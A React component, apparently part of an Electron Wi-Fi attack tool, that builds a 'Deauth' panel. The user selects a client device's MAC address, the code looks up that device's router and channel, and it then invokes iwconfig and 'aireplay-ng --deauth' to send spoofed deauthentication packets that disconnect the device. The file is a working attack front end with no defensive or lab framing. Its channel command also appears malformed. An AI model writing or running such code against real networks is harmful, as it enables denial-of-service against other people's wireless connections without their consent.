import React, { useState } from "react";
import { Select, Button, Form, InputNumber } from "antd";
const { Option } = Select;

export default function Deauth(params) {
  const [macID, setMacId] = useState({
    CID: "",
    RID: "",
    Custom: false,
    packAmount: 30,
    channel: 6,
  });
  async function targetDevice() {
    console.log(macID);
    console.log(params.wifiCard);
    if (params.wifiCard === "") {
      alert("Please select a wifi card to start deauthing");
      return;
    }
    let cmd1 = `${params.wifiCard} channel${macID.channel}`;
    let res1 = await window.ipcRenderer.invoke("command", {
      command: "iwconfig",
      params: cmd1.split(" "),
    });
    let cmd2 = `--deauth ${macID.packAmount} -c ${macID.CID} -a ${macID.RID} ${params.wifiCard}`;
    let res2 = await window.ipcRenderer.invoke("command", {
      command: "aireplay-ng",
      params: cmd2.split(" "),
    });
    alert(res2);
  }
  const MACCB = (e, i) => {
    let dog = params.clients.filter((device) => {
      return device["Station MAC"] == e;
    })[0];
    let routerChannel = params.stations.filter((station) => {
      console.log(station.BSSID);
      return station.BSSID == dog[" BSSID"].trim();
    });
    setMacId({
      ...macID,
      channel: routerChannel[0][" channel"],
      CID: e,
      RID: dog[" BSSID"].trim(),
      Custom: false,
    });
  };

  return (
    <div className="deauth">
      <h2>Deauth</h2>
      <p>
        To use this module select a device from the analysis table, This will
        look up the associated router and send a deauth packages looking like
        that router, to your desired device.
      </p>
      <Form.Item label="Mac Id">
        <Select onChange={MACCB} id="selectedCap" placeholder="Select a MAC Id">
          {params.clients.map((MAC, i) => {
            return (
              <Option value={MAC["Station MAC"]} key={i}>
                {MAC["Station MAC"]}
              </Option>
            );
          })}
        </Select>
      </Form.Item>

      <Form.Item id="amount" label="Packets">
        <InputNumber
          onChange={(e) => {
            setMacId({ ...macID, packAmount: e });
          }}
          defaultValue={30}
        />
      </Form.Item>
      <Button type="primary" onClick={targetDevice}>
        Target Device
      </Button>
    </div>
  );
}
